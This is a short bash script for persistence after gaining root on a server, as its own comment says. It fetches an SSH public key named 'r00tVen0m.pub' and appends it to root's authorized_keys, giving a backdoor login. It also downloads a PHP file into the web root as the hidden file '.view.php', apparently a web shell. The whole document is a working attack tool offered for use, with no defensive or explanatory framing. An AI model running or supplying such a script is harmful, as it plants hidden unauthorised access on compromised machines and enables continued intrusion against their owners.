#!/bin/bash

#after get root you can setup  all  scripts 
mkdir /root/.ssh
chmod 600 /root/.ssh
curl 127.0.0.1/r00tVen0m.pub >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
curl 127.0.0.1/view.php -o /var/www/html/.view.php
